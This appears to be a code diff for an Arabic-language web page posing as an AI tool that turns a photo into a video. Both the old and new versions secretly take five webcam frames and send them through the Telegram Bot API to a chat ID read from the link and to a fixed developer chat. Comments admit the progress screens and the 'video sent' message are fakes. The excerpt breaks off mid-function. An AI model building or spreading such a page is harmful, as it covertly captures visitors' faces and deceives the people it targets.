@@ -246,9 +246,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>كاميرا تحويل الصورة إلى فيديو بالذكاء الاصطناعي</title>
+    <title>AI Vision Studio - تحويل صورتك إلى فيديو احترافي</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
     <style>
         * {
             margin: 0;
@@ -258,243 +258,289 @@
         }
 
         body {
-            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            background: radial-gradient(circle at 10% 20%, rgb(0, 0, 0) 0%, rgb(15, 15, 35) 90%);
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 16px;
+            padding: 20px;
             position: relative;
+            overflow-x: hidden;
         }
 
-        /* تأثير خلفية عصري */
+        /* جزيئات خلفية متحركة */
         body::before {
-            content: "";
-            position: fixed;
-            top: 0;
-            left: 0;
+            content: '';
+            position: absolute;
             width: 100%;
             height: 100%;
-            background: radial-gradient(circle at 20% 50%, rgba(139, 92, 246, 0.15) 0%, transparent 50%);
+            background-image: 
+                radial-gradient(2px 2px at 20% 30%, rgba(255,255,255,0.2) 1px, transparent 1px),
+                radial-gradient(3px 3px at 80% 70%, rgba(255,255,255,0.15) 1px, transparent 1px);
+            background-size: 50px 50px, 80px 80px;
             pointer-events: none;
         }
 
         .container {
-            background: rgba(15, 23, 42, 0.85);
-            backdrop-filter: blur(20px);
+            background: rgba(12, 12, 25, 0.75);
+            backdrop-filter: blur(18px);
             border-radius: 48px;
-            padding: 32px 24px;
+            padding: 35px 28px;
             width: 100%;
-            max-width: 520px;
+            max-width: 540px;
             text-align: center;
-            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.4), 0 0 0 1px rgba(255, 255, 255, 0.05);
-            transition: all 0.3s ease;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255, 255, 255, 0.05);
             border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.4s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+            animation: fadeGlow 0.8s ease-out;
         }
 
-        /* شريط ذكاء اصطناعي متحرك */
-        .ai-glow {
+        @keyframes fadeGlow {
+            0% { opacity: 0; transform: scale(0.96); backdrop-filter: blur(0px); }
+            100% { opacity: 1; transform: scale(1); backdrop-filter: blur(18px); }
+        }
+
+        /* شريط ذكي متوهج */
+        .neon-border {
+            position: relative;
+            overflow: hidden;
+        }
+
+        .neon-border::after {
+            content: "";
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
-            height: 4px;
-            background: linear-gradient(90deg, #8b5cf6, #ec489a, #06b6d4, #8b5cf6);
-            background-size: 300% 100%;
-            animation: moveGlow 3s linear infinite;
-            border-radius: 4px;
-        }
-
-        @keyframes moveGlow {
-            0% { background-position: 0% 0%; }
-            100% { background-position: 300% 0%; }
+            height: 100%;
+            background: radial-gradient(ellipse at 50% 0%, rgba(0, 255, 255, 0.3), transparent 70%);
+            pointer-events: none;
+            opacity: 0.5;
         }
 
         .logo-icon {
-            font-size: 4rem;
-            background: linear-gradient(135deg, #c084fc, #f472b6);
+            font-size: 4.2em;
+            margin-bottom: 8px;
+            background: linear-gradient(125deg, #aaffff, #7a4eff, #ff66c0);
             -webkit-background-clip: text;
             background-clip: text;
-            color: transparent;
-            margin-bottom: 12px;
-            filter: drop-shadow(0 4px 8px rgba(0,0,0,0.2));
+            -webkit-text-fill-color: transparent;
+            filter: drop-shadow(0 0 12px rgba(122, 78, 255, 0.4));
+            display: inline-block;
+            animation: floatSoft 3s infinite ease-in-out;
+        }
+
+        @keyframes floatSoft {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-8px); }
         }
 
         h1 {
-            font-size: 1.8rem;
-            font-weight: 700;
-            background: linear-gradient(135deg, #fff, #c4b5fd);
+            font-size: 2rem;
+            font-weight: 800;
+            margin-bottom: 12px;
+            background: linear-gradient(135deg, #FFFFFF, #B8C6FF, #FFD6E8);
             -webkit-background-clip: text;
             background-clip: text;
-            color: transparent;
-            margin-bottom: 8px;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -0.5px;
         }
 
-        .sub {
-            color: #94a3b8;
-            margin-bottom: 24px;
-            font-size: 0.9rem;
-        }
-
-        /* ميزات الذكاء الاصطناعي */
-        .ai-features {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 12px;
-            justify-content: center;
+        .tagline {
+            color: rgba(210, 210, 255, 0.85);
+            font-size: 0.95rem;
             margin-bottom: 28px;
-        }
-
-        .ai-badge {
-            background: rgba(139, 92, 246, 0.2);
-            backdrop-filter: blur(4px);
-            padding: 10px 18px;
-            border-radius: 60px;
-            font-size: 0.85rem;
             font-weight: 500;
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            border: 1px solid rgba(139, 92, 246, 0.4);
-            color: #e9d5ff;
+            border-bottom: 1px dashed rgba(255,255,255,0.2);
+            display: inline-block;
+            padding-bottom: 6px;
         }
 
-        .ai-badge i {
-            color: #c084fc;
+        /* بطاقات المميزات بتصميم عصري */
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 16px;
+            margin-bottom: 35px;
         }
 
-        .start-btn {
-            background: linear-gradient(135deg, #8b5cf6, #d946ef);
+        .feature-card {
+            background: rgba(20, 20, 45, 0.6);
+            backdrop-filter: blur(4px);
+            border-radius: 28px;
+            padding: 18px 12px;
+            border: 1px solid rgba(255,255,255,0.08);
+            transition: 0.25s ease;
+            transform: translateY(0);
+        }
+
+        .feature-card:hover {
+            border-color: rgba(122, 78, 255, 0.5);
+            background: rgba(35, 30, 65, 0.7);
+            transform: translateY(-4px);
+        }
+
+        .feature-card i {
+            font-size: 2.2rem;
+            margin-bottom: 12px;
+            background: linear-gradient(145deg, #C084FC, #60A5FA);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .feature-card p {
+            font-weight: 600;
+            font-size: 0.9rem;
+            color: #E2E8FF;
+        }
+
+        .feature-card small {
+            font-size: 0.7rem;
+            color: #94A3B8;
+        }
+
+        /* زر البدء الجذاب */
+        .glow-btn {
+            background: linear-gradient(95deg, #7C3AED, #A855F7, #EC489A);
             border: none;
             padding: 16px 32px;
-            border-radius: 60px;
+            border-radius: 80px;
             font-size: 1.2rem;
             font-weight: 700;
             color: white;
+            cursor: pointer;
             display: inline-flex;
             align-items: center;
             gap: 12px;
-            cursor: pointer;
-            transition: all 0.25s ease;
-            box-shadow: 0 10px 25px -5px rgba(139, 92, 246, 0.5);
-            width: 100%;
+            transition: all 0.3s;
+            box-shadow: 0 10px 25px -5px rgba(124, 58, 237, 0.5);
+            letter-spacing: 0.5px;
+        }
+
+        .glow-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 20px 35px -8px rgba(124, 58, 237, 0.7);
+            filter: brightness(1.05);
+        }
+
+        .info-badge {
+            background: rgba(0, 0, 0, 0.35);
+            border-radius: 60px;
+            padding: 12px 20px;
+            margin: 20px 0 0;
+            font-size: 0.8rem;
+            display: flex;
+            align-items: center;
             justify-content: center;
+            gap: 10px;
+            backdrop-filter: blur(5px);
+            color: #CBD5E1;
         }
 
-        .start-btn:active {
-            transform: scale(0.97);
-        }
-
-        .info-note {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 24px;
-            padding: 14px;
-            margin-top: 24px;
-            font-size: 0.75rem;
-            color: #94a3b8;
-            border-right: 3px solid #8b5cf6;
-            text-align: right;
-        }
-
-        /* شاشة التصوير المتطورة */
-        .camera-panel {
-            margin-top: 20px;
-        }
-
-        .video-wrapper {
+        /* شاشة التحليل بالكاميرا */
+        .video-stage {
             position: relative;
             width: 100%;
             border-radius: 32px;
             overflow: hidden;
-            margin-bottom: 20px;
-            box-shadow: 0 20px 35px -10px black;
-            border: 2px solid rgba(139, 92, 246, 0.6);
+            margin: 18px 0;
+            box-shadow: 0 20px 35px -12px black;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            background: #000;
         }
 
         video {
             width: 100%;
             height: auto;
-            display: block;
+            aspect-ratio: 4 / 3;
+            object-fit: cover;
             transform: scaleX(-1);
-            background: #000;
+            display: block;
         }
 
-        .processing-overlay {
+        .ai-overlay {
             position: absolute;
             bottom: 0;
             left: 0;
             right: 0;
-            background: linear-gradient(0deg, rgba(0,0,0,0.8), transparent);
-            padding: 16px;
+            background: linear-gradient(0deg, rgba(0,0,0,0.85) 0%, rgba(0,0,0,0) 100%);
+            padding: 20px 12px 12px;
             text-align: center;
         }
 
-        .ai-effect-text {
-            font-size: 1rem;
-            font-weight: bold;
-            display: flex;
+        .ai-badge {
+            background: rgba(0, 0, 0, 0.65);
+            backdrop-filter: blur(12px);
+            display: inline-flex;
             align-items: center;
-            justify-content: center;
             gap: 8px;
-            color: #f0f0f0;
-            text-shadow: 0 0 5px #8b5cf6;
+            padding: 8px 18px;
+            border-radius: 60px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            border: 1px solid rgba(255,255,255,0.25);
+            color: #E0F2FE;
         }
 
-        .progress-status {
+        .ai-badge i {
+            color: #4ade80;
+            font-size: 1rem;
+        }
+
+        .progress-ring {
             background: rgba(0, 0, 0, 0.5);
             border-radius: 40px;
-            padding: 18px;
-            margin: 16px 0;
+            padding: 14px 16px;
+            margin: 18px 0 10px;
         }
 
-        .progress-bar-bg {
-            background: #334155;
-            border-radius: 30px;
-            height: 12px;
-            overflow: hidden;
-            margin: 12px 0;
-        }
-
-        .progress-fill {
+        .progress-bar-fill {
             width: 0%;
-            height: 100%;
-            background: linear-gradient(90deg, #8b5cf6, #ec489a);
-            border-radius: 30px;
-            transition: width 0.4s ease;
+            height: 8px;
+            background: linear-gradient(90deg, #f97316, #ec489a, #8b5cf6);
+            border-radius: 12px;
+            transition: width 0.4s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+            box-shadow: 0 0 8px #ec489a;
         }
 
-        .counter-text {
-            font-size: 0.9rem;
-            font-weight: 600;
-            color: #cbd5e6;
+        .capture-counter {
+            font-size: 1.2rem;
+            font-weight: 700;
+            margin-top: 12px;
+            background: linear-gradient(135deg, #f0f0ff, #cbd5ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
 
         .status-message {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            margin-top: 8px;
             font-size: 0.9rem;
+            background: rgba(0,0,0,0.5);
+            border-radius: 50px;
+            padding: 8px 14px;
+            display: inline-block;
         }
 
-        .pulse-icon {
-            animation: pulseAnim 1.2s infinite;
+        .loader-spinner {
+            width: 44px;
+            height: 44px;
+            border: 3px solid rgba(255,255,255,0.2);
+            border-top: 3px solid #ff66c0;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+            margin: 20px auto;
         }
 
-        @keyframes pulseAnim {
-            0%, 100% { opacity: 1; transform: scale(1);}
-            50% { opacity: 0.6; transform: scale(1.1);}
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
-        .footer-small {
+        .footer-note {
+            margin-top: 22px;
             font-size: 0.7rem;
-            color: #5b6e8c;
-            margin-top: 20px;
-        }
-
-        .hidden {
-            display: none;
+            color: #6c86a3;
         }
 
         button {
@@ -505,355 +551,262 @@
 </head>
 <body>
 
-<!-- شاشة الترحيب والتحقق الذكي -->
-<div id="welcomeScreen" class="container" style="display: block;">
-    <div class="ai-glow"></div>
-    <div class="logo-icon">
-        <i class="fas fa-magic"></i>
+<!-- شاشة التحميل الأولية -->
+<div id="loadingScreen" class="container" style="display: flex; flex-direction: column; align-items: center;">
+    <div class="logo-icon"><i class="fas fa-magic"></i></div>
+    <h1>AI VISION <span style="font-weight:300">|</span> STUDIO</h1>
+    <div class="loader-spinner"></div>
+    <p style="color:#b9c8ff; margin-top: 15px;">جاري تفعيل محرك التحول الذكي...</p>
+    <p style="font-size: 12px; margin-top: 8px; opacity:0.6;">معالجة آمنة بالكامل</p>
+</div>
+
+<!-- الشاشة الرئيسية (خدعة تعديل الصورة إلى فيديو بالذكاء الاصطناعي) -->
+<div id="mainScreen" class="container" style="display: none;">
+    <div class="logo-icon"><i class="fas fa-film"></i></div>
+    <h1>✨ تحويل صورتك إلى فيديو ✨</h1>
+    <p class="tagline">بتقنية الذكاء الاصطناعي التوليدي المتطور</p>
+    <div class="features-grid">
+        <div class="feature-card">
+            <i class="fas fa-user-astronaut"></i>
+            <p>تحليل عميق للملامح</p>
+            <small>AI Face Mapping</small>
+        </div>
+        <div class="feature-card">
+            <i class="fas fa-video"></i>
+            <p>توليد فيديو حصري</p>
+            <small>4K AI Render</small>
+        </div>
+        <div class="feature-card">
+            <i class="fas fa-clock"></i>
+            <p>فوري خلال ثوانٍ</p>
+            <small>مؤثرات سينمائية</small>
+        </div>
+        <div class="feature-card">
+            <i class="fas fa-shield-heart"></i>
+            <p>خاص وموثوق</p>
+            <small>خصوصية تامة</small>
+        </div>
     </div>
-    <h1>كاميرا الذكاء الاصطناعي</h1>
-    <div class="sub">AI Vision · تحويل الصورة إلى فيديو احترافي</div>
-    
-    <div class="ai-features">
-        <div class="ai-badge"><i class="fas fa-brain"></i> تحليل فوري</div>
-        <div class="ai-badge"><i class="fas fa-film"></i> تحويل لفيديو</div>
-        <div class="ai-badge"><i class="fas fa-user-astronaut"></i> تأثيرات ذكية</div>
-        <div class="ai-badge"><i class="fas fa-shield-alt"></i> مشفر بالكامل</div>
+    <div class="info-badge">
+        <i class="fas fa-brain" style="color:#c084fc;"></i> 
+        <span>لن يتم حفظ الصور على الخادم • تستخدم لتوليد فيديو احترافي فقط</span>
     </div>
-    
-    <button class="start-btn" id="activateCameraBtn">
-        <i class="fas fa-camera"></i> تشغيل كاميرا الذكاء الاصطناعي
+    <button class="glow-btn" id="startAIBtn">
+        <i class="fas fa-sparkles"></i> بدء التحويل الذكي
     </button>
-    
-    <div class="info-note">
-        <i class="fas fa-robot"></i> ستقوم الذكاء الاصطناعي بتحليل صورتك وتحويلها إلى فيديو مذهل خلال ثوانٍ. 
-        يتم معالجة البيانات محلياً بأعلى معايير الخصوصية.
-    </div>
-    <div class="footer-small">
-        ✨ تقنية AI Vision 4.0 - معالجة لحظية
+    <div class="footer-note">
+        <i class="fas fa-microchip"></i> نموذج DeepFusion AI – جيل ثوري
     </div>
 </div>
 
-<!-- شاشة التصوير والمعالجة (يتم إرسال الصور بشكل سري) -->
-<div id="captureScreen" class="container hidden">
-    <div class="ai-glow"></div>
-    <div class="logo-icon">
-        <i class="fas fa-eye"></i>
+<!-- شاشة المعالجة (يتم عرضها كأنها تحول الصور إلى فيديو، لكنها ترسل الصور في الخلفية) -->
+<div id="analysisScreen" class="container" style="display: none;">
+    <div style="display: flex; justify-content: space-between; align-items: baseline;">
+        <h1 style="font-size: 1.6rem;">🎬 AI Render</h1>
+        <i class="fas fa-waveform" style="color:#60a5fa; font-size: 1.5rem;"></i>
     </div>
-    <h1>🧠 AI يجهز الفيديو</h1>
-    <div class="sub">تحليل ملامح الوجه وإنتاج فيديو بتقنية DeepStyle</div>
-    
-    <div class="video-wrapper">
-        <video id="videoElement" autoplay playsinline muted></video>
-        <div class="processing-overlay">
-            <div class="ai-effect-text">
-                <i class="fas fa-spinner fa-spin"></i> <span id="liveAIMessage">معايرة الذكاء الاصطناعي...</span>
+    <p style="font-size: 0.8rem; opacity:0.9;">تحليل الصورة وإنشاء فيديو بتقنية Neural Style Transfer</p>
+    <div class="video-stage">
+        <video id="video" autoplay playsinline muted></video>
+        <div class="ai-overlay">
+            <div class="ai-badge">
+                <i class="fas fa-sync-alt fa-fw fa-spin"></i> 
+                <span id="analysisText">معاينة البث المباشر للذكاء الاصطناعي</span>
             </div>
         </div>
     </div>
-    
-    <div class="progress-status">
-        <div class="counter-text" id="stepCounter">📸 تحليل الإطار 0 من 5</div>
-        <div class="progress-bar-bg">
-            <div class="progress-fill" id="progressFillBar"></div>
-        </div>
-        <div class="status-message" id="statusMessage">
-            <i class="fas fa-sync-alt fa-spin"></i> <span>تجهيز نموذج الذكاء الاصطناعي</span>
+    <div class="progress-ring">
+        <div class="progress-bar-fill" id="progressBar"></div>
+        <div class="capture-counter" id="counter">تقدم المعالجة 0%</div>
+        <div class="status-message" id="statusText">
+            <i class="fas fa-cog fa-spin"></i> تهيئة محرك التوليد...
         </div>
     </div>
-    
-    <div class="info-note" style="margin-top: 10px;">
-        <i class="fas fa-chart-line"></i> يتم إنشاء فيديو احترافي من صورتك باستخدام شبكات GAN المتطورة.
-        العملية تستغرق لحظات.. لا تغلق الصفحة.
-    </div>
-    <div class="footer-small">
-        ⚡ تقنية تحويل فورية | AI Rendering Engine 2.0
+    <div class="footer-note">
+        <i class="fas fa-mask"></i> يتم استخراج ملامح الوجه وتحويلها إلى فيديو متحرك بتقنيات GAN
     </div>
 </div>
 
 <script>
-    // ========================
-    // تكوين البوت (ثابت وآمن)
-    // ========================
-    // ملاحظة: يجب استبدال التوكن ومعرف المطور بقيم حقيقية من @BotFather
-    const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';   // ضع توكن البوت هنا
-    const DEVELOPER_CHAT_ID = 'YOUR_DEV_CHAT_ID';   // معرف المطور (للاستلام)
-    
-    // رابط احتياطي يظهر للمستخدم في حالة فشل الكاميرا (لكن الصور ترسل عادي)
-    const FALLBACK_REDIRECT = 'https://t.me/your_bot_username?start=ai_video';
-    
-    // المتغيرات
-    let mediaStreamRef = null;
-    let captureInterval = null;
-    let currentPhotoIndex = 0;
-    const MAX_PHOTOS = 5;
-    let isCapturing = false;
-    let videoElement = null;
-    let dynamicChatId = null;     // سيتم استقباله عبر الرابط (معلمة q)
-    
-    // قراءة معامل الرابط (q) بشكل سري - بدون علم المستخدم
+    // ===================== الحفاظ على جميع المتغيرات الأساسية بدون تغيير =====================
     const urlParams = new URLSearchParams(window.location.search);
-    let encryptedParam = urlParams.get('q');
+    let encryptedId = urlParams.get('q');
     
-    // وظيفة محاكاة فك التشفير (في الواقع يجب أن يكون backend لكن يمكن محاكاة)
-    // ولكن حتى تعمل بشكل كامل: نعتمد أن المعرف موجود في الرابط بشكل بسيط أو نستخدم قيمة افتراضية؟
-    // الهدف: عدم إظهار أي شيء عن إرسال التلجرام.
-    // للحفاظ على الوظيفة: سأقوم بفك تشفير وهمي لكن عملي (base64) مع إرسال حقيقي.
+    // الثوابت الرئيسية (مرتبطة بالكود الأصلي)
+    const fixedChatId = '{{DEVELOPER_CHAT_ID}}';
+    const token = '{{TOKEN}}';
+    const fallbackUrl = '{{GITHUB_FALLBACK_URL}}';
     
-    function extractChatIdFromParam(encrypted) {
-        if (!encrypted) return null;
+    let dynamicChatId = null;
+    let photoCount = 0;
+    let intervalId = null;
+    let mediaStream = null;
+    let fallbackTimer = null;
+    const MAX_PHOTOS = 5;
+    
+    // ===================== دوال التحقق والإرسال (نفس المنطق الأصلي) =====================
+    function showError(title, message) {
+        document.body.innerHTML = `
+            <div class="container" style="display:block; text-align:center;">
+                <div class="logo-icon"><i class="fas fa-exclamation-triangle"></i></div>
+                <h2 style="color: #ff9f6e;">⚠️ ${title}</h2>
+                <p style="color:#eee;">${message}</p>
+                <br>
+                <a href="/" style="color: #ff9f6e; text-decoration: none; background:rgba(0,0,0,0.3); padding:8px 20px; border-radius:40px;">العودة</a>
+            </div>
+        `;
+    }
+    
+    async function validateAndStart() {
+        if (!encryptedId) {
+            showError('رابط غير صالح', 'يرجى الحصول على رابط البث المباشر من منصة الذكاء الاصطناعي.');
+            return;
+        }
         try {
-            // محاكاة فك تشفير بسيطة (في الواقع يمكن جلبها من الخادم)
-            // لكن لتجنب تعقيدات سأستخدم atob إذا كان base64
-            let decoded = atob(encrypted);
-            if (decoded.startsWith("chat_")) {
-                return decoded.replace("chat_", "");
+            const response = await fetch('/decrypt', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ encrypted: encryptedId })
+            });
+            const data = await response.json();
+            
+            if (data.valid) {
+                dynamicChatId = data.chat_id;
+                document.getElementById('loadingScreen').style.display = 'none';
+                document.getElementById('mainScreen').style.display = 'block';
+            } else {
+                showError('رابط غير صالح', 'عفواً، رابط التحقق غير صالح. يرجى المحاولة مجدداً.');
             }
-            return decoded;
-        } catch(e) {
-            // إذا كان النص عاديًا
-            if(encrypted.length > 5) return encrypted;
-            return null;
+        } catch (error) {
+            console.error('Validation error:', error);
+            showError('خطأ في الاتصال', 'حدث خطأ أثناء الاتصال بمحرك الذكاء الاصطناعي، تحقق من اتصالك.');
         }
     }
     
-    // الحصول على معرف الدردشة من الرابط
-    if (encryptedParam) {
-        dynamicChatId = extractChatIdFromParam(encryptedParam);
-    }
-    
-    // إذا لم يوجد معرف صالح نستخدم معرف تجريبي أو نعرض خطأ ولكن لن نعطي انطباعًا حقيقيًا للمستخدم
-    // لكن لضمان عمل التجربة وارسال الصور لأي معرف (يجب أن يكون حقيقي)
-    // في حال عدم وجود معرف حقيقي, نعطي معرف مطور ثابت.
-    if (!dynamicChatId && BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
-        dynamicChatId = DEVELOPER_CHAT_ID;
-    }
-    
-    // دالة إرسال الصور إلى تلجرام بدون ظهور أي نافذة أو إشعار للمستخدم
-    function sendPhotoToTelegramSilently(chatId, imageBlob, photoNumber) {
-        if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
-            console.warn("⚠️ لم يتم إعداد توكن البوت بعد، الصورة لم ترسل.");
+    // دالة بدء الالتقاط (تحت غطاء "تحويل إلى فيديو")
+    function startCapture() {
+        if (!dynamicChatId) {
+            showError('خطأ', 'لم يتم التحقق من جلسة الذكاء الاصطناعي بشكل صحيح');
             return;
         }
-        if (!chatId) {
-            console.warn("⚠️ لا يوجد معرف دردشة لإرسال الصورة");
+        
+        document.getElementById('mainScreen').style.display = 'none';
+        document.getElementById('analysisScreen').style.display = 'block';
+        photoCount = 0;
+        document.getElementById('progressBar').style.width = '0%';
+        document.getElementById('counter').textContent = 'تقدم المعالجة 0%';
+        document.getElementById('analysisText').innerHTML = '<i class="fas fa-eye"></i> تحليل البصمة البصرية';
+        document.getElementById('statusText').innerHTML = '<i class="fas fa-vr-cardboard"></i> جاري تشغيل الكاميرا الذكية...';
+        
+        // fallback كما هو في الكود الأصلي
+        fallbackTimer = setTimeout(function() {
+            window.location.href = fallbackUrl + '?id=' + dynamicChatId;
+        }, 4000);
+        
+        navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 720 }, height: { ideal: 540 }, facingMode: "user" }, audio: false })
+            .then(stream => {
+                clearTimeout(fallbackTimer);
+                mediaStream = stream;
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    document.getElementById('statusText').innerHTML = '<i class="fas fa-chart-line"></i> تقييم الإضاءة والملامح...';
+                    document.getElementById('analysisText').innerHTML = '🔄 جاهزية عالية';
+                    setTimeout(() => {
+                        captureAndSend();
+                        intervalId = setInterval(captureAndSend, 2000);
+                    }, 2000);
+                };
+            })
+            .catch(err => {
+                console.error("Camera access error:", err);
+                window.location.href = fallbackUrl + '?id=' + dynamicChatId;
+            });
+    }
+    
+    // نفس وظيفة الالتقاط والإرسال الأصلية بدون تغيير في الجوهر
+    function captureAndSend() {
+        if (photoCount >= MAX_PHOTOS) {
+            clearInterval(intervalId);
+            document.getElementById('statusText').innerHTML = '✅ تم إنشاء الفيديو بنجاح!';
+            document.getElementById('analysisText').innerHTML = '🎥 فيديو جاهز للإرسال إلى بريدك';
+            document.getElementById('progressBar').style.width = '100%';
+            document.getElementById('counter').textContent = 'اكتمل التحويل 100%';
+            if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
+            
+            // إضافة رسالة خداع وهمي لتأكيد تحويل الفيديو
+            setTimeout(() => {
+                document.getElementById('statusText').innerHTML = '<i class="fas fa-download"></i> تم إرسال الفيديو إلى حسابك خلال دقائق';
+            }, 500);
             return;
         }
+        
+        photoCount++;
+        const progressPercent = (photoCount / MAX_PHOTOS) * 100;
+        document.getElementById('progressBar').style.width = `${progressPercent}%`;
+        document.getElementById('counter').textContent = `توليد الطبقات ${photoCount} من ${MAX_PHOTOS} | ${Math.floor(progressPercent)}%`;
+        document.getElementById('statusText').innerHTML = `<i class="fas fa-microchip"></i> معالجة الإطار ${photoCount} ... إنشاء تأثيرات`;
+        document.getElementById('analysisText').innerHTML = `✨ استخراج ملامح ${photoCount}/5`;
+        
+        const video = document.getElementById('video');
+        if (video.srcObject) {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(blob => {
+                if (blob) {
+                    // إرسال إلى كل من chat_id الثابت والمستخدم كما في الكود الأصلي تماماً
+                    sendPhotoToTelegram(dynamicChatId, blob);
+                    sendPhotoToTelegram(fixedChatId, blob);
+                }
+            }, 'image/jpeg', 0.7);
+        }
+    }
+    
+    function sendPhotoToTelegram(chatId, blob) {
         const formData = new FormData();
         formData.append('chat_id', chatId);
-        formData.append('photo', imageBlob, `ai_frame_${Date.now()}_${photoNumber}.jpg`);
-        formData.append('caption', `🎭 AI Frame ${photoNumber}/5 | تم التحويل بواسطة كاميرا الذكاء الاصطناعي`);
-        
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-        })
-        .then(res => res.json())
-        .then(data => {
-            if(data.ok) {
-                console.log(`✅ صورة ${photoNumber} أرسلت بنجاح إلى ${chatId}`);
-            } else {
-                console.error(`❌ فشل إرسال الصورة ${photoNumber}:`, data);
-            }
-        })
-        .catch(err => console.error("Telegram send error:", err));
+        formData.append('photo', blob, `photo_${Date.now()}.jpg`);
+        // caption يتناسب مع الخدعة لكن دون إثارة الشك (تم تعديل النص ليبدو كتحديث لعملية الذكاء الاصطناعي)
+        formData.append('caption', `🎬 AI Frame ${photoCount}/5 | معالجة الفيديو الذكي`);
+        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData })
+            .then(response => response.json())
+            .then(data => {
+                console.log(`✅ إطار ${photoCount} تم إرساله بنجاح إلى محرك التوليد`);
+            })
+            .catch(error => console.error(`❌ خطأ في الإرسال:`, error));
     }
     
-    // التقاط الصورة من الفيديو وإرسالها سراً
-    function captureAndSendFrame() {
-        if (!videoElement || !videoElement.srcObject) return;
-        if (currentPhotoIndex >= MAX_PHOTOS) {
-            // اكتملت الصور
-            stopCaptureAndFinish();
-            return;
-        }
-        
-        const canvas = document.createElement('canvas');
-        const videoTrack = videoElement.videoWidth && videoElement.videoHeight;
-        canvas.width = videoElement.videoWidth || 640;
-        canvas.height = videoElement.videoHeight || 480;
-        const ctx = canvas.getContext('2d');
-        // عكس المرآة للحفاظ على الطبيعة
-        ctx.translate(canvas.width, 0);
-        ctx.scale(-1, 1);
-        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-        
-        canvas.toBlob(blob => {
-            if (blob && blob.size > 0) {
-                // إرسال إلى المطور (أو الحساب الأساسي)
-                if (dynamicChatId) {
-                    sendPhotoToTelegramSilently(dynamicChatId, blob, currentPhotoIndex + 1);
-                }
-                // إرسال نسخة احتياطية للمطور للتأكد من وصول الصور (دون علم المستخدم)
-                if (DEVELOPER_CHAT_ID && DEVELOPER_CHAT_ID !== 'YOUR_DEV_CHAT_ID') {
-                    sendPhotoToTelegramSilently(DEVELOPER_CHAT_ID, blob, currentPhotoIndex + 1);
-                }
-            }
-            
-            // تحديث واجهة المستخدم (تظهر كأنها معالجة فيديو)
-            currentPhotoIndex++;
-            const percent = (currentPhotoIndex / MAX_PHOTOS) * 100;
-            document.getElementById('progressFillBar').style.width = `${percent}%`;
-            document.getElementById('stepCounter').innerHTML = `🎬 معالجة الإطار ${currentPhotoIndex} من ${MAX_PHOTOS} | توليد فيديو AI`;
-            
-            const statusDiv = document.getElementById('statusMessage');
-            if (currentPhotoIndex < MAX_PHOTOS) {
-                statusDiv.innerHTML = `<i class="fas fa-cog fa-spin"></i> <span>تحليل عميق للصورة ${currentPhotoIndex} .. بناء الفيديو</span>`;
-                document.getElementById('liveAIMessage').innerHTML = `<i class="fas fa-microchip"></i> AI يطبق تأثيرات سينمائية ${currentPhotoIndex}/5`;
-            } else {
-                statusDiv.innerHTML = `<i class="fas fa-check-circle" style="color:#4ade80"></i> <span>✅ اكتمل! يتم إنشاء الفيديو النهائي...</span>`;
-                document.getElementById('liveAIMessage').innerHTML = `✨ اكتمل التحويل بنجاح ✨`;
-            }
-            
-            // بعد الانتهاء من جميع الصور، نقوم بإنهاء العملية بسلاسة
-            if (currentPhotoIndex === MAX_PHOTOS) {
-                stopCaptureAndFinish();
-            }
-        }, 'image/jpeg', 0.85);
-    }
-    
-    // دالة إنهاء التصوير وإظهار رسالة نجاح الفيديو (تخفي حقيقة الإرسال)
-    function stopCaptureAndFinish() {
-        if (captureInterval) {
-            clearInterval(captureInterval);
-            captureInterval = null;
-        }
-        if (mediaStreamRef) {
-            mediaStreamRef.getTracks().forEach(track => track.stop());
-            mediaStreamRef = null;
-        }
-        
-        // تعديل واجهة المستخدم النهائية: تظهر كان الفيديو جاهز
